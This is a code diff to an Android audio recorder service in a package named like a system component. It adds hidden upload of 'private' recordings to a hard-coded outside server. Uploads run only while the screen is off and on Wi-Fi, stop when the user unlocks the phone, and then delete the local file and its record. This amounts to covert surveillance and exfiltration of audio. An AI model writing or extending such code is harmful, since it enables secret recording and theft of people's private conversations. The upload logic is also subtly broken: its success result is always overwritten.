@@ -2,10 +2,25 @@ package com.android.audiorecorder.engine;
 
 import java.io.File;
 import java.io.IOException;
+import java.nio.charset.Charset;
 import java.util.Calendar;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
+
+import org.apache.http.HttpEntity;
+import org.apache.http.HttpResponse;
+import org.apache.http.HttpStatus;
+import org.apache.http.HttpVersion;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.mime.HttpMultipartMode;
+import org.apache.http.entity.mime.MultipartEntityBuilder;
+import org.apache.http.entity.mime.content.FileBody;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.params.CoreConnectionPNames;
+import org.apache.http.params.CoreProtocolPNames;
+import org.apache.http.protocol.HTTP;
 
 import android.app.Notification;
 import android.app.NotificationManager;
@@ -24,7 +39,9 @@ import android.media.MediaRecorder;
 import android.media.MediaRecorder.OnErrorListener;
 import android.os.Environment;
 import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.IBinder;
+import android.os.Message;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 import android.os.RemoteException;
@@ -40,11 +57,14 @@ import com.android.audiorecorder.RecorderFile;
 import com.android.audiorecorder.SoundRecorder;
 import com.android.audiorecorder.dao.FileManagerFactory;
 import com.android.audiorecorder.dao.IFileManager;
+import com.android.audiorecorder.engine.ProgressOutHttpEntity.ProgressListener;
 import com.android.audiorecorder.engine.RecorderUploader.UploadResult;
 import com.android.audiorecorder.utils.DateUtil;
 import com.android.audiorecorder.utils.FileUtils;
+import com.android.audiorecorder.utils.NetworkUtil;
+import com.android.audiorecorder.utils.Utils;
 
-public class AudioService extends Service implements UploadResult{
+public class AudioService extends Service{
 	
 	public final static int PAGE_NUMBER = 1;
     private static final int AM = 0;
@@ -58,6 +78,8 @@ public class AudioService extends Service implements UploadResult{
     private int mCurMode;
     
     public static final String Action_RecordListen = "com.audio.Action_BluetoothRecord";
+    public static final String key_upload_url = "key_upload_url";
+    public static final String default_url = "http://davmb.com/file_recv.php";
 
     /* action */
     public static final String Action_Record = "com.dahuatech.audio.Action_Record";
@@ -107,6 +129,7 @@ public class AudioService extends Service implements UploadResult{
     private int audioStopId;
 
     private AudioManager mAudioManager;
+    private PowerManager mPowerManager;
     private int mCurAudoMode;
     private boolean mIsSpeekPhoneOn;
     private Object lock = new Object();
@@ -135,7 +158,15 @@ public class AudioService extends Service implements UploadResult{
     private int mPhoneState;
     
     private TimeSchedule mTimeSchedule;
-    private RecorderUploader mUploader;
+    //private RecorderUploader mUploader;
+    
+    private UploadHandlerCallback mUploadHandlerCallback;
+    private HandlerThread mUpHandlerThread;
+    private Handler mUploadHandler;
+    
+    private long mTransferedBytes;
+    
+    private String mPath;
     
     private Handler mHandler = new Handler() {
         public void handleMessage(android.os.Message msg) {
@@ -167,9 +198,6 @@ public class AudioService extends Service implements UploadResult{
                 case MSG_TIMER_ALARM:
                     processTimerAlarm();
                     break;
-                case MSG_START_UPLOAD:
-                	startUploadTask();
-                	break;
                 default:
                     break;
             }
@@ -187,23 +215,28 @@ public class AudioService extends Service implements UploadResult{
     @Override
     public void onCreate() {
         super.onCreate();
-        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        mPowerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
         this.mPreferences = getSharedPreferences("SoundRecorder", Context.MODE_PRIVATE);
-        mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,"SoundRecorderService");
-        mAlarmWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AlarmWakeLock");
+        mWakeLock = mPowerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,"SoundRecorderService");
+        mAlarmWakeLock = mPowerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AlarmWakeLock");
         mAudioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
         mNotificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
         mCurMode = MODE_MANLY;
         IntentFilter filter = new IntentFilter();
         filter.addAction(TimeSchedule.ACTION_TIMER_ALARM);
+        filter.addAction(Intent.ACTION_USER_PRESENT);
         if (mStateChnageReceiver == null) {
             mStateChnageReceiver = new BroadcastReceiver() {
                 @Override
                 public void onReceive(Context context, Intent intent) {
                     final String action = intent.getAction();
+                    if(DebugConfig.DEBUG){
+                        Log.i(TAG, "---> action = " + action);
+                    }
                     if(TimeSchedule.ACTION_TIMER_ALARM.equalsIgnoreCase(action)){
                         mHandler.sendEmptyMessage(MSG_TIMER_ALARM);
-                        Log.i(TAG, "---->android test timer alarm.");
+                    } else if(Intent.ACTION_USER_PRESENT.equalsIgnoreCase(action)){
+                        ProgressOutHttpEntity.mCancle = true;
                     }
                 }
             };
@@ -235,7 +268,10 @@ public class AudioService extends Service implements UploadResult{
         fileManager = FileManagerFactory.getSmsManagerInstance(this);
         mTimeSchedule = new TimeSchedule(this);
         mTimeSchedule.start();
-        mUploader = new RecorderUploader(this);
+        mUploadHandlerCallback = new UploadHandlerCallback();
+        mUpHandlerThread = new HandlerThread("upload_thread", HandlerThread.MAX_PRIORITY);
+        mUpHandlerThread.start();
+        mUploadHandler = new Handler(mUpHandlerThread.getLooper(), mUploadHandlerCallback);
         mCurMode = MODE_AUTO;
         Log.d(TAG, "===> onCreate.");
     }
@@ -255,6 +291,10 @@ public class AudioService extends Service implements UploadResult{
         if (mStateChnageReceiver != null) {
             unregisterReceiver(mStateChnageReceiver);
             mStateChnageReceiver = null;
+        }
+        if(mUpHandlerThread != null){
+            mUpHandlerThread.quit();
+            mUpHandlerThread = null;
         }
         Log.d(TAG, "===> onDestroy.");
     }
@@ -410,7 +450,7 @@ public class AudioService extends Service implements UploadResult{
                                 + mAudioManager.isBluetoothA2dpOn()
                                 + " isBluetoothScoOn  = "
                                 + mAudioManager.isBluetoothScoOn());
-                if (bluetoothStateReceiver == null) {
+                if (bluetoothStateReceiver == null && Utils.hasHoneycomb()) {
                     bluetoothStateReceiver = new BroadcastReceiver() {
                         @Override
                         public void onReceive(Context context, Intent intent) {
@@ -516,7 +556,7 @@ public class AudioService extends Service implements UploadResult{
         mRecoderPath += child;
         if(!fileManager.isExists(mRecoderPath)){
             fileManager.createDiretory(mRecoderPath);
-            for(int i=1;i<10;i++){
+            for(int i=1;i<5;i++){
                 fileManager.createDiretory(mRecoderPath+i);
             }
         }
@@ -624,11 +664,9 @@ public class AudioService extends Service implements UploadResult{
             if(mCurMode == MODE_AUTO && mRecorderStart){
                 mHandler.sendEmptyMessage(MSG_STOP_RECORD);
             }
-            if(isValidUploadTime()){//start
-            	if(mUploader.getResult() != PROCESS) {
-            		mHandler.removeMessages(MSG_START_UPLOAD);
-            		mHandler.sendEmptyMessage(MSG_START_UPLOAD);
-            	}
+            if(isValidUploadTime() && !mPowerManager.isScreenOn() && NetworkUtil.isWifiDataEnable(this)){//start
+                mUploadHandler.removeMessages(MSG_START_UPLOAD);
+                mUploadHandler.sendEmptyMessage(MSG_START_UPLOAD);
             }
         }
         mTimeSchedule.setRtcTimerAlarm();
@@ -646,31 +684,15 @@ public class AudioService extends Service implements UploadResult{
         return dayOfHour>=UPLOAD_START && dayOfHour<=UPLOAD_END;
     }
     
-    @Override
-    public void onResult(int result, int id, long progress) {
-    	if(result == FAIL){
-    		fileManager.updateUpLoadProgress(progress, id);
-    	}
-    	mHandler.removeMessages(MSG_START_UPLOAD);
-		mHandler.sendEmptyMessage(MSG_START_UPLOAD);
-		Log.i(TAG, "---> onResult = " + result);
-		//falg = false;
-    }
-    
-    boolean falg = false;
     private void startUploadTask(){
     	List<RecorderFile> list = fileManager.queryPrivateFileList(0, PAGE_NUMBER);
-    	Log.i(TAG, "---> size = " + list.size());
 		if(list.size()>0){
 			RecorderFile file = list.get(0);
-			if(file != null && !falg){
-				falg = true;
-				mUploader.setInfo(file.getId(), file.getPath());
-				if(DebugConfig.DEBUG){
-					Log.i(TAG, "---> upload id = " + file.getId() + " path = " + file.getPath());
-				}
-				mUploader.start();
-			}
+			initUploadFile(file.getId(), file.getPath());
+		}else{
+		    if(DebugConfig.DEBUG){
+		        Log.w(TAG, "---> No Files.");
+		    }
 		}
     }
     
@@ -681,4 +703,83 @@ public class AudioService extends Service implements UploadResult{
         mAlarmWakeLock.acquire(2000);
     }
     
+    private void initUploadFile(long id, String path){
+        if(DebugConfig.DEBUG){
+            Log.i(TAG, "initUploadFile id = " + id + " path = " + path);
+        }
+        File file = new File(path);
+        MultipartEntityBuilder entitys = MultipartEntityBuilder.create();
+        entitys.setMode(HttpMultipartMode.BROWSER_COMPATIBLE);
+        entitys.setCharset(Charset.forName(HTTP.UTF_8));
+
+        entitys.addPart("file", new FileBody(file));
+        HttpEntity httpEntity = entitys.build();
+        //long totalSize = httpEntity.getContentLength();
+        ProgressOutHttpEntity progressHttpEntity = new ProgressOutHttpEntity(
+                httpEntity, new ProgressListener() {
+                    @Override
+                    public void transferred(long transferedBytes) {
+                        // publishProgress((int) (100 * transferedBytes / totalSize));
+                        mTransferedBytes = transferedBytes;
+                    }
+                });
+        if(uploadFile(mPreferences.getString(key_upload_url, default_url), progressHttpEntity) == UploadResult.SUCCESS){
+            File f = new File(path);
+            f.delete();
+            fileManager.delete(id);
+            if(DebugConfig.DEBUG){
+                Log.i(TAG, "upload success. path = " + path);
+            }
+        }
+        mUploadHandler.removeMessages(MSG_START_UPLOAD);
+        mUploadHandler.sendEmptyMessage(MSG_START_UPLOAD);
+    }
+    
+    private int uploadFile(String url, ProgressOutHttpEntity entity) {
+        int mResult;
+        HttpClient httpClient = new DefaultHttpClient();
+        httpClient.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
+        httpClient.getParams().setParameter(CoreConnectionPNames.CONNECTION_TIMEOUT, 10000);
+        HttpPost httpPost = new HttpPost(url);
+        httpPost.setEntity(entity);
+        mResult = UploadResult.PROCESS;
+        try {
+            HttpResponse httpResponse = httpClient.execute(httpPost);
+            if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
+                if(!ProgressOutHttpEntity.mCancle){
+                    mResult = UploadResult.SUCCESS;
+                } else {
+                    mResult = UploadResult.FAIL;
+                }
+            }
+        } catch (Exception e) {
+            mResult = UploadResult.FAIL;
+            e.printStackTrace();
+        } finally {
+            if (httpClient != null && httpClient.getConnectionManager() != null) {
+                httpClient.getConnectionManager().shutdown();
+            }
+            if(DebugConfig.DEBUG){
+                Log.i(TAG, "upload size = " + mTransferedBytes);
+            }
+            mResult = UploadResult.IDLE;
+        }
+        return mResult;
+    }
+    
+    private class UploadHandlerCallback implements Handler.Callback{
+        
+        @Override
+        public boolean handleMessage(Message msg) {
+            switch(msg.what){
+                case MSG_START_UPLOAD:
+                    startUploadTask();
+                    break;
+                    default:
+                        break;
+            }
+            return true;
+        }
+        
+    }
 }
